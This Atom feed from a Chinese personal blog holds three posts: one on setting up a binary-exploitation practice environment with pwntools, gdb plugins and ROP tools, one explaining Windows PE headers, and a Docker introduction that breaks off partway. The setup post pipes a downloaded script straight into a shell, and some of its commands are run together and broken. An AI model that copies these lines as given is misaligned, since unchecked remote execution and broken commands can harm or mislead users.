<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>热爱 | bleaner</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bleaner.club/"/>
  <updated>2020-03-17T10:24:30.845Z</updated>
  <id>http://bleaner.club/</id>
  
  <author>
    <name>y gao</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pwn入门学习(一）—— 环境搭建</title>
    <link href="http://bleaner.club/2020/01/22/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0(%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://bleaner.club/2020/01/22/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0(%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-01-21T16:00:00.000Z</published>
    <updated>2020-03-17T10:24:30.845Z</updated>
    
    <content type="html"><![CDATA[</p><h1 id="pwn入门学习-一）——-环境搭建"><a href="#pwn入门学习-一）——-环境搭建" class="headerlink" title="pwn入门学习(一）—— 环境搭建"></a>pwn入门学习(一）—— 环境搭建</h1><p>疫情期间学习技术#中国加油##武汉加油#<br>所用环境为Ubuntu 18.04</p><h2 id="更换Ubuntu下载镜像源"><a href="#更换Ubuntu下载镜像源" class="headerlink" title="更换Ubuntu下载镜像源"></a>更换Ubuntu下载镜像源</h2><p>Ubuntu默认下载源在美国，相对速度较慢，可将其下载镜像源更换为国内镜像。<br>清华开源软件镜像站Ubuntu：<code>mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</code><br>具体操作：<br>(1) 备份源文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/apt</span><br><span class="line">sudo cp source.list source.list.back</span><br></pre></td></tr></table></figure></p><p>(2) 更换源文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit source.list</span><br></pre></td></tr></table></figure></p><p>将源文件内容删除，按照自己的操作系统版本换源，效果如下：<br><img src="https://img2018.cnblogs.com/blog/1937083/202003/1937083-20200301175458639-1249940840.png" alt><br>(1)</p><h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载地址：http://www.trapkit.de/tools/checksec.html</span><br></pre></td></tr></table></figure><h3 id="32位依赖库"><a href="#32位依赖库" class="headerlink" title="32位依赖库"></a>32位依赖库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install lib32ncurses5</span><br><span class="line">apt install lib32z1</span><br></pre></td></tr></table></figure><h3 id="Peda-Gef-Pwndbg"><a href="#Peda-Gef-Pwndbg" class="headerlink" title="Peda Gef Pwndbg"></a>Peda Gef Pwndbg</h3><p>安装pwndbg：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></p><p>安装gef：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O-https://github.com/hugsy/gef/raw/master/scripts/gef.sh| sh</span><br></pre></td></tr></table></figure></p><p>安装peda：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git clonehttps://github.com/longld/peda.git~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure></p><p>使用那个插件就把其他几个注释掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source ~/pwndbg/gdbinit.py</span><br><span class="line">#source ~/peda/peda.py</span><br><span class="line">#source ~/.gdbinit-gef.py</span><br></pre></td></tr></table></figure></p><h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>LibcSearcher用来泄露libc库中函数的偏移的库<br>github地址：<br><code>https://github.com/lieanu/LibcSearcher</code><br>安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure></p><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p>做题的工具，用来找gadget<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo pip install capstonesudo </span><br><span class="line">git clone https://github.com/lieanu/libc.git ~/LibcSearchercd libc</span><br><span class="line">cd ~/LibcSearcher  </span><br><span class="line">git submodule update --init --recursivesudo </span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img width=&quot;700px&quot; height=&quot;400px&quot; src=&quot;http://q7bvs3hjk.bkt.clouddn.com/static/images/paw3.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="知识总结" scheme="http://bleaner.club/categories/%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="二进制" scheme="http://bleaner.club/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="linux" scheme="http://bleaner.club/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>PE文件结构(一)</title>
    <link href="http://bleaner.club/2020/01/22/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84(%E4%B8%80)/"/>
    <id>http://bleaner.club/2020/01/22/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84(%E4%B8%80)/</id>
    <published>2020-01-21T16:00:00.000Z</published>
    <updated>2020-03-17T12:08:38.074Z</updated>
    
    <content type="html"><![CDATA[</p><h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><p>PE（Portable Execute）文件是Windows下可执行文件的总称，常见的有DLL，EXE，OCX，SYS等，事实上，一个文件是否是PE文件与其扩展名无关，PE文件可以是任何扩展名。PE文件是指32位可执行文件，也称PE32。64位可执行文件称为PE+或PE32+，是PE(PE32)的一种扩展形式(注意不是PE64)</p><p>PE文件的结构一般来说如下图所示：从起始位置开始依次是DOS头，NT头，节表以及具体的节。</p><p><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/docker/pe1.png" alt></p><h3 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h3><p>DOS头是用来兼容MS-DOS操作系统的，64字节，共四行，目的是当这个文件在MS-DOS上运行时提示一段文字，大部分情况下是：This program cannot be run in DOS mode.还有一个目的，就是指明NT头在文件中的位置。<br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/docker/pe2.png" alt></p><p>4字节（共4行）的DOS头，第一个成员2个字节是可执行文件的标志信息；最后一个成员4字节是PE头的偏移地址为00000100H，我们可以根据00000100H来获取PE头的地址。而DOS头和PE头中间的空余位置是一些垃圾值以及编译器填充的一些“is program cannot be run in DOS mode.”或“This program must be run under Win32”等信息。</p><h3 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h3><p>NT头包含windows PE文件的主要信息，其中包括一个‘PE’字样的签名，PE文件头（IMAGE_FILE_HEADER）和PE可选头（IMAGE_OPTIONAL_HEADER32）。</p><h3 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h3><p>节表：是PE文件后续节的描述，windows根据节表的描述加载每个节。<br>节：每个节实际上是一个容器，可以包含代码、数据等等，每个节可以有独立的内存权限，比如代码节默认有读/执行权限，节的名字和数量可以自己定义，未必是上图中的三个。</p><h3 id="VA和RVA"><a href="#VA和RVA" class="headerlink" title="VA和RVA"></a>VA和RVA</h3><p>PE文件使用偏移(offset)，内存中使用VA(Virtual Address)来表示位置。<br>VA指虚拟内存的绝对地址，RVA(Relative Virtual Address，相对虚拟地址)是指从某基准位置(Image Base)开始的相对地址。<br>PE头内部信息大多是以RVA形式存在，原因在于PE文件(主要是DLL)加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他PE文件(DLL)，此时必须通过重定向( Relocation)将其加载到其他空白的位置,若PE头信息使用的是VA,则无法正常访问。因此使用RVA来重定向信息,即使发生了重定向，只要相对于基准位置的相对位置没有变化，就能正常访问到指定信息，不会出现任何问题。<br>当PE文件被执行时，PE装载器会为进程分配4G的虚拟地址空间，然后把程序所占用的磁盘空间作为虚拟内存映射到这个4G的虚拟地址空间(ImageBase)中，一般情况下，会映射到虚拟地址空间中的0x400000的位置。<br>VA与RVA满足以下换算关系：<br><code>RVA+ImageBase=VA</code></p><h2 id="0x02-PE头结构"><a href="#0x02-PE头结构" class="headerlink" title="0x02 PE头结构"></a>0x02 PE头结构</h2><ul><li>PE头结构：DOS头+NT头<h3 id="DOS头（分Header和DOS存根）"><a href="#DOS头（分Header和DOS存根）" class="headerlink" title="DOS头（分Header和DOS存根）"></a>DOS头（分Header和DOS存根）</h3><blockquote><p>Header结构(00000000 - 0000003F，共64个字节)<br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/docker/pe3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123; // DOS的.EXE头部</span><br><span class="line">  USHORT e_magic;          // DOS签名“MZ--&gt;Mark Zbikowski（设计了DOS的工程师）” -&gt; 4D 5A </span><br><span class="line">  USHORT e_cblp;             // 文件最后页的字节数 -&gt; 00 90 -&gt; 144</span><br><span class="line">  USHORT e_cp;               // 文件页数 -&gt; 00 30 -&gt; 48</span><br><span class="line">  USHORT e_crlc;             // 重定义元素个数 -&gt; 00 00</span><br><span class="line">  USHORT e_cparhdr;       // 头部尺寸，以段落为单位 -&gt; 00 04</span><br><span class="line">  USHORT e_minalloc;      // 所需的最小附加段 -&gt; 00 00</span><br><span class="line">  USHORT e_maxalloc;     // 所需的最大附加段 -&gt; FF FF</span><br><span class="line">  USHORT e_ss;              // 初始的SS值（相对偏移量） -&gt; 00 00</span><br><span class="line">  USHORT e_sp;             // 初始的SP值 -&gt; 00 B8 -&gt; 184</span><br><span class="line">  USHORT e_csum;         // 校验和 -&gt; 00 00</span><br><span class="line">  USHORT e_ip;            // 初始的IP值 -&gt; 00 00</span><br><span class="line">  USHORT e_cs;            // 初始的CS值（相对偏移量） -&gt; 00 00</span><br><span class="line">  USHORT e_lfarlc;        // 重分配表文件地址 -&gt; 00 40 -&gt; 64</span><br><span class="line">  USHORT e_ovno;        // 覆盖号 -&gt; 00 00</span><br><span class="line">  USHORT e_res[4];      // 保留字 -&gt; 00 00 00 00 00 00 00 00</span><br><span class="line">  USHORT e_oemid;     // OEM标识符（相对e_oeminfo） -&gt; 00 00</span><br><span class="line">  USHORT e_oeminfo;   // OEM信息 -&gt; 00 00</span><br><span class="line">  USHORT e_res2[10];  // 保留字 -&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  LONG e_lfanew;       // 指示NT头的偏移（根据不同文件拥有可变值） -&gt; 00 00 00 C0 -&gt; 192&apos;</span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure></blockquote></li></ul><p><em>#注意Win+Intel的电脑上大部分采用”小端法”，字节在内存中储存方式是倒过来的。</em></p><p>重要参数为<code>e_magic</code>和<code>e_lfanew</code></p><blockquote><p>DOS存根（00000040 - 000000BF，共128字节）</p></blockquote><p>DOS存根则是一段简单的DOS程序，主要用来输出类似“This program cannot be run in DOS mode.”的提示语句。即使没有DOS存根，程序也能正常执行。</p><h3 id="NT头-PE最重要的头"><a href="#NT头-PE最重要的头" class="headerlink" title="NT头(PE最重要的头)"></a>NT头(PE最重要的头)</h3><ul><li><p>IMAGE_NT_HEADERS32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS &#123; </span><br><span class="line">        DWORD Signature;                         // 类似于DOS头中的e_magic -&gt; 00 00 45 50 -&gt; PE</span><br><span class="line">        IMAGE_FILE_HEADER FileHeader;             // IMAGE_FILE_HEADER是PE文件头，定义如下</span><br><span class="line">        IMAGE_OPTIONAL_HEADER32 OptionalHeader;   // </span><br><span class="line">        &#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure></li><li><p>IMAGE_FILE_HEADER：其中有4个重要的成员，若设置不正确，将会导致文件无法正常运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123; </span><br><span class="line">        WORD    Machine;               // 每个CPU拥有唯一的Machine码 -&gt; 4C 01 -&gt; PE -&gt; 兼容32位Intel X86芯片&apos;</span><br><span class="line"></span><br><span class="line">        WORD    NumberOfSections;      // 指文件中存在的节段（又称节区）数量，也就是节表中的项数 -&gt; 00 04 -&gt; 4</span><br><span class="line">                                       // 该值一定要大于0，且当定义的节段数与实际不符时，将发生运行错误。&apos;</span><br><span class="line"></span><br><span class="line">        DWORD   TimeDateStamp;         // PE文件的创建时间，一般有连接器填写 -&gt; 38 D1 29 1E</span><br><span class="line">        DWORD   PointerToSymbolTable;  // COFF文件符号表在文件中的偏移 -&gt; 00 00 00 00</span><br><span class="line">        DWORD   NumberOfSymbols;       // 符号表的数量 -&gt; 00 00 00 00</span><br><span class="line"></span><br><span class="line">        WORD    SizeOfOptionalHeader;  // 指出IMAGE_OPTIONAL_HEADER32结构体的长度。-&gt;  00 E0 -&gt; 224字节</span><br><span class="line">                                       // PE32+格式文件中使用的是IMAGE_OPTIONAL_HEADER64结构体，</span><br><span class="line">                                       // 这两个结构体尺寸是不相同的，所以需要在SizeOfOptionalHeader中指明大小。&apos;</span><br><span class="line"></span><br><span class="line">        WORD    Characteristics;       // 标识文件的属性，二进制中每一位代表不同属性 -&gt; 0F 01</span><br><span class="line">                                       // 属性参见https://blog.csdn.net/qiming_zhang/article/details/7309909#3.2.2&apos;&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure></li><li><p>IMAGE_OPTIONAL_HEADER：其中有9个重要参数，设置错误会导致文件无法运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123; </span><br><span class="line">        WORD    Magic;                      // 魔数 32位为0x10B，64位为0x20B，ROM镜像为0x107&apos;</span><br><span class="line">        BYTE    MajorLinkerVersion;         // 链接器的主版本号 -&gt; 05</span><br><span class="line">        BYTE    MinorLinkerVersion;         // 链接器的次版本号 -&gt; 0C</span><br><span class="line">        DWORD   SizeOfCode;                 // 代码节大小，一般放在“.text”节里，必须是FileAlignment的整数倍 -&gt; 40 00 04 00</span><br><span class="line">        DWORD   SizeOfInitializedData;      // 已初始化数大小，一般放在“.data”节里，必须是FileAlignment的整数倍 -&gt; 40 00 0A 00</span><br><span class="line">        DWORD   SizeOfUninitializedData;    // 未初始化数大小，一般放在“.bss”节里，必须是FileAlignment的整数倍 -&gt; 00 00 00 00</span><br><span class="line">        DWORD   AddressOfEntryPoint;        // 指出程序最先执行的代码起始地址(RVA) -&gt; 00 00 10 00&apos;</span><br><span class="line">        DWORD   BaseOfCode;                 // 代码基址，当镜像被加载进内存时代码节的开头RVA。必须是SectionAlignment的整数倍 -&gt; 40 00 10 00</span><br><span class="line"></span><br><span class="line">        DWORD   BaseOfData;                 // 数据基址，当镜像被加载进内存时数据节的开头RVA。必须是SectionAlignment的整数倍 -&gt; 40 00 20 00</span><br><span class="line">                                            // 在64位文件中此处被并入紧随其后的ImageBase中。</span><br><span class="line"></span><br><span class="line">        DWORD   ImageBase;                  // 当加载进内存时，镜像的第1个字节的首选地址。</span><br><span class="line">                                            // WindowEXE默认ImageBase值为00400000，DLL文件的ImageBase值为10000000，也可以指定其他值。</span><br><span class="line">                                            // 执行PE文件时，PE装载器先创建进程，再将文件载入内存，</span><br><span class="line">                                            // 然后把EIP寄存器的值设置为ImageBase+AddressOfEntryPoint&apos;</span><br><span class="line"></span><br><span class="line">                                            // PE文件的Body部分被划分成若干节段，这些节段储存着不同类别的数据。&apos;</span><br><span class="line">        DWORD   SectionAlignment;           // SectionAlignment指定了节段在内存中的最小单位， -&gt; 00 00 10 00&apos;</span><br><span class="line">        DWORD   FileAlignment;              // FileAlignment指定了节段在磁盘文件中的最小单位，-&gt; 00 00 02 00</span><br><span class="line">                                            // SectionAlignment必须大于或者等于FileAlignment&apos;</span><br><span class="line"></span><br><span class="line">        WORD    MajorOperatingSystemVersion;// 主系统的主版本号 -&gt; 00 04</span><br><span class="line">        WORD    MinorOperatingSystemVersion;// 主系统的次版本号 -&gt; 00 00</span><br><span class="line">        WORD    MajorImageVersion;          // 镜像的主版本号 -&gt; 00 00</span><br><span class="line">        WORD    MinorImageVersion;          // 镜像的次版本号 -&gt; 00 00</span><br><span class="line">        WORD    MajorSubsystemVersion;      // 子系统的主版本号 -&gt; 00 04</span><br><span class="line">        WORD    MinorSubsystemVersion;      // 子系统的次版本号 -&gt; 00 00</span><br><span class="line">        DWORD   Win32VersionValue;          // 保留，必须为0 -&gt; 00 00 00 00</span><br><span class="line"></span><br><span class="line">        DWORD   SizeOfImage;                // 当镜像被加载进内存时的大小，包括所有的文件头。向上舍入为SectionAlignment的倍数。</span><br><span class="line">                                            // 一般文件大小与加载到内存中的大小是不同的。 -&gt; 00 00 50 00&apos;</span><br><span class="line"></span><br><span class="line">        DWORD   SizeOfHeaders;              // 所有头的总大小，向上舍入为FileAlignment的倍数。</span><br><span class="line">                                            // 可以以此值作为PE文件第一节的文件偏移量。-&gt; 00 00 04 00&apos;</span><br><span class="line"></span><br><span class="line">        DWORD   CheckSum;                   // 镜像文件的校验和 -&gt; 00 00 B4 99</span><br><span class="line"></span><br><span class="line">        WORD    Subsystem;                  // 运行此镜像所需的子系统 -&gt; 00 02 -&gt; 窗口应用程序</span><br><span class="line">                                            // 用来区分系统驱动文件（*.sys)与普通可执行文件（*.exe，*.dll），</span><br><span class="line">                                            // 参考：https://blog.csdn.net/qiming_zhang/article/details/7309909#3.2.3&apos;</span><br><span class="line"></span><br><span class="line">        WORD    DllCharacteristics;         // DLL标识 -&gt; 00 00</span><br><span class="line">        DWORD   SizeOfStackReserve;         // 最大栈大小。CPU的堆栈。默认是1MB。-&gt; 00 10 00 00</span><br><span class="line">        DWORD   SizeOfStackCommit;          // 初始提交的堆栈大小。默认是4KB -&gt; 00 00 10 00</span><br><span class="line">        DWORD   SizeOfHeapReserve;          // 最大堆大小。编译器分配的。默认是1MB -&gt;00 10 00 00</span><br><span class="line">        DWORD   SizeOfHeapCommit;           // 初始提交的局部堆空间大小。默认是4K -&gt;00 00 10 00</span><br><span class="line">        DWORD   LoaderFlags;                // 保留，必须为0 -&gt; 00 00 00 00</span><br><span class="line"></span><br><span class="line">        DWORD   NumberOfRvaAndSizes;        // 指定DataDirectory的数组个数，由于以前发行的Windows NT的原因，它只能为16。 -&gt; 00 00 00 10</span><br><span class="line">        IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; &apos;// 数据目录数组。详见下文。&apos; </span><br><span class="line">    &#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br><span class="line">typedef struct _IMAGE_DATA_DIRECTORY &#123;  </span><br><span class="line">    DWORD   VirtualAddress;  </span><br><span class="line">    DWORD   Size;  </span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure></li><li><p>DataDirectory[] 数据目录数组：数组每项都有被定义的值，不同项对应不同数据结构。重点关注的IMPORT和EXPORT，它们是PE头中的非常重要的部分，其它部分不怎么重要，大致了解下即可。<br>*</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory &apos;&apos;#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img width=&quot;700px&quot; height=&quot;400px&quot; src=&quot;http://q7bvs3hjk.bkt.clouddn.com/static/images/paw2.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="知识总结" scheme="http://bleaner.club/categories/%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="二进制" scheme="http://bleaner.club/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Docker入门总结</title>
    <link href="http://bleaner.club/2020/01/22/Docker%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://bleaner.club/2020/01/22/Docker%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/</id>
    <published>2020-01-21T16:00:00.000Z</published>
    <updated>2020-03-17T12:05:47.179Z</updated>
    
    <content type="html"><![CDATA[<br><!--# Docker入门总结--></p><h2 id="Docker是什么？"><a href="#Docker是什么？" class="headerlink" title="Docker是什么？"></a>Docker是什么？</h2><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux机器或Windows 机器上,也可以实现虚拟化,容器是完全使用沙箱机制,相互之间不会有任何接口。</p><h2 id="Docker的特点"><a href="#Docker的特点" class="headerlink" title="Docker的特点"></a>Docker的特点</h2><ul><li>轻量，在一台机器上运行的多个Docker容器可以共享这台机器的操作系统内核；它们能够迅速启动，只需占用很少的计算和内存资源。镜像是通过文件系统层进行构造的，并共享一些公共文件。这样就能尽量降低磁盘用量，并能更快地下载镜像。</li><li>标准，Docker容器基于开放式标准，能够在所有主流Linux版本、Microsoft Windows以及包括VM、裸机服务器和云在内的任何基础设施上运行。</li><li>安全，Docker赋予应用的隔离性不仅限于彼此隔离，还独立于底层的基础设施。Docker默认提供最强的隔离，因此应用出现问题，也只是单个容器的问题，而不会波及到整台机器。</li></ul><h2 id="和虚拟机的比较"><a href="#和虚拟机的比较" class="headerlink" title="和虚拟机的比较"></a>和虚拟机的比较</h2><p>简单来说： 容器和虚拟机具有相似的资源隔离和分配优势，但功能有所不同，因为容器虚拟化的是操作系统，而不是硬件，因此容器更容易移植，效率也更高。</p><p>传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。</p><p>两者的对比图：<br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/blog/docker1.png" alt></p><ul><li>容器是一个应用层抽象，用于将代码和依赖资源打包在一起。 多个容器可以在同一台机器上运行，共享操作系统内核，但各自作为独立的进程在用户空间中运行 。与虚拟机相比， 容器占用的空间较少（容器镜像大小通常只有几十兆），瞬间就能完成启动 。</li><li>虚拟机（VM）是一个物理硬件层抽象，用于将一台服务器变成多台服务器。 管理程序允许多个VM在一台机器上运行。每个VM都包含一整套操作系统、一个或多个应用、必要的二进制文件和库资源，因此占用大量空间。而且VM启动也十分缓慢 。</li></ul><p>虽然docker有那么多优势，但我们也没必要去完全否定虚拟机技术，因为两者有不同的使用场景。虚拟机更擅长于彻底隔离整个运行环境。例如，云服务提供商通常采用虚拟机技术隔离不同的用户。而Docker通常用于隔离不同的应用 ，例如前端，后端以及数据库。</p><h2 id="Docker的基本概念"><a href="#Docker的基本概念" class="headerlink" title="Docker的基本概念"></a>Docker的基本概念</h2><p>Docker包括三个基本概念：</p><ul><li>镜像（Image）</li><li>容器（Container）</li><li>仓库（Repository）</li></ul><p><strong>镜像（Image）——一个特殊的文件系统</strong></p><p>操作系统分为内核和用户空间。对于Linux而言，内核启动后，会挂载root文件系统为其提供用户空间支持。而Docker镜像（Image），就相当于是一个root文件系统。</p><p>Docker镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。 镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p><p><strong>容器（Container）——镜像运行时的实体</strong></p><p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等 。</p><p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的命名空间。前面讲过镜像使用的是分层存储，容器也是如此。</p><p>容器存储层的生存周期和容器一样，容器消亡时，容器存储层也随之消亡。因此，任何保存于容器存储层的信息都会随容器删除而丢失。</p><p><strong>仓库（Repository）——集中存放镜像文件的地方</strong></p><p>镜像构建完成后，可以很容易的在当前宿主上运行，但是， 如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry就是这样的服务。</p><p>一个Docker Registry中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。所以说：镜像仓库是Docker用来集中存放镜像文件的地方类似于我们之前常用的代码仓库。</p><p>通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本 。我们可以通过&lt;仓库名&gt;:&lt;标签&gt;的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以latest作为默认标签。</p><h2 id="Docker的安装"><a href="#Docker的安装" class="headerlink" title="Docker的安装"></a>Docker的安装</h2><p>可以参考官方文档以获取最新的Docker支持情况，官方文档：<br><code>https://docs.docker.com/install/</code></p><p>Docker分为CE和EE两个版本，CE即社区版，免费；EE即企业版，付费使用。<br>Docker的安装参考官方文档：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 